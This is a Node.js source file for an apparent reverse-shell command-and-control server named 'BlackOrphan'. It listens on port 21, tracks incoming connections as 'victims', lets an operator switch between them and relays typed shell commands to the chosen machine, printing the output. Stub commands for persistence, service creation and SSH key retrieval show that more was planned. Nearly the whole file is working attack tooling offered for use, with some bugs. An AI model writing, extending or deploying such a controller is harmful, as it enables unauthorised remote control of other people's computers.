#!/usr/bin/env node
//'use strict';

const net = require('net');

const util = require('util');
const color = require('colors/safe');
const exec = require('child_process').exec;

//const BlackOrphanWrite = require('console').Console;
//const setVictims = require('./misc/initvictims.js');
//const handleInput = require('./misc/handleinput.js');
//const {searchUser,showAllUsers} = require('./misc/victimtrasverse.js');
// no need to use rdinterface.write, it fucks up the prompt
//const bo = new BlackOrphanWrite(process.stdout);

let currentClient;



let serverList = {};

let prompt = {
    prompt() {
	process.stdout.write(color.bgBlack(color.grey(color.green(`${this.id}_${this.address}:${this.port}`) + ' > ')));
    },
    setPrompt(sockParams) {
	Object.assign(this, sockParams);
    }
};


let i = 0;
function initVictim(socket) {
    
    let _id = (++i) + "_" + socket.remotePort;
    
    // each socket object is unique
    serverList[_id] = {
	id: _id,
	sock: socket,
	address: socket.remoteAddress,
	port: socket.remotePort,
	localPort: socket.localPort,
	localAddress: socket.localAddress
    };
    
    return { serverList };
}




const tcpServer = net.createServer((socket) => {
    
    var socketList;
    let sock;
    let {localAddress,localPort,remoteAddress,remotePort} = socket;
    console.log(`\nsending new connection from ${localAddress}:${localPort} to ${remoteAddress}:${remotePort}`);
    
    socketList = initVictim(socket).serverList;

    if ( ! currentClient ) {
	currentClient = socketList[Object.getOwnPropertyNames(socketList)[0]];
	let {id,port,address} = currentClient;
	prompt.setPrompt({id,port,address});
    }

    prompt.prompt();
    
    process.stdin.setEncoding('utf-8');
    
    process.stdin.on('readable', (  ) => {

	let data = process.stdin.read();

	if ( data === null )  return ;

	let cmd =  /([a-z]+)?/.exec(data)[1];
	
	if ( ! cmd  ) return prompt.prompt();
	    
	switch (cmd) {
	case "switch":
	    let getUserToSwitch = data.split(" ")[1].trim();
	    
	    if ( getUserToSwitch && Number.isInteger(Number(getUserToSwitch))) {
		// building regexp to match request victim 
		let userRegexp = new RegExp(`^(${getUserToSwitch}){1,}`);

		currentClient = Object.keys(socketList).filter(( l ) => (userRegexp.test(l)) );

		currentClient = socketList[currentClient];
		
		if ( ! currentClient ) {
		    process.stdout.write(color.red("There is no user with the id of " +  getUserToSwitch));
		    prompt.prompt();
		    return ;
		}
		
		let { id, address, port } = currentClient;
		
		prompt.setPrompt({id,port,address});
		prompt.prompt();
		
	    }
	    break;
	    
	case 'list':
	    
	    let objNames = Object.getOwnPropertyNames(socketList);
	    console.log(objNames);
	    let i = 0;
	    
	    objNames.forEach((sockets) => {
		let {id, port, address, localPort, localAddress} = socketList[sockets];
		process.stdout.write(`${(++i)} ${localAddress}:${localPort} --> ${address}:${port}\n`);
		
	    });
	    prompt.prompt();
	    break;
	case 'persistent':
	    
	    sock = currentClient["sock"];
	    
	    

	    
	    break;
	case 'createservice':
	    sock = currentClient["sock"];
	    break;
	case 'getssh':
	    sock = currentClient["sock"];
	    break;
	case 'putssh':
	    sock = currentClient["sock"];
	    break;
	case 'opensshsession':
	    
	    sock = currentClient["sock"];
	    
	    break;
	    
	case 'killclient':

	    
	    let { id , port , address} = currentClient;
	    
	    let getIdNum = id.match(/^(\d+)/)[1];
	    
	    let getPreviousClient = Number(getIdNum) - 1;

	    let getNextClient = Number(getIdNum) + 1;

	    //delete socketList[currentClient]; // i can't tell why this does not work o.O

	    delete serverList[currentClient];
	    
	    if ( getPreviousClient !== 0 ) {
				
		let userRegexp = new RegExp(`^(${getPreviousClient}){1,}`);
		

		currentClient = Object.keys(socketList).filter(( l ) => userRegexp.test(l) );

		currentClient = socketList[currentClient];
		
		prompt.setPrompt({ id, port, address} = currentClient);

		prompt.prompt();

		return ;
		// get the next client if there is really one
	    } else if (
		Object.keys(socketList).filter( l => new RegExp(`^(${getNextClient}){1,}`).test(l) ).length !== 0 ) {
		
		currentClient = Object.keys(socketList).filter( l => new RegExp(`^(${getNextClient}){1,}`).test(l) );
		
		currentClient = socketList[currentClient];
		
		prompt.setPrompt({id, port, address} = currentClient);

		prompt.prompt();

		return ;
		
	    }


	    id = port = address = '**';


	    currentClient = undefined;
	    process.stdout.write('no active connection now\n');
	    prompt.setPrompt({id,port,address});
	    prompt.prompt();
	    break;
	    
	default:

	    try {
		sock = currentClient["sock"];
	    } catch ( ex ) {
		process.stdout.write(color.red('no active connection') + '\n');
		return prompt.prompt();
	    }
	    
	    
	    sock.write(data);
	    
	    sock.on('data', ( data ) => {
		
		process.stdout.write(data);
		prompt.prompt();
	    });

	    sock.on('error', (err) => {
		proces.stderr.write(err)
		prompt.prompt();
	    });

	    // remove socket from here
	    sock.on('end', () => {
		
		
	    });
	}
	
    });

    
});

tcpServer.listen(21, () => {
    console.log('listening for connection on port 21');
});
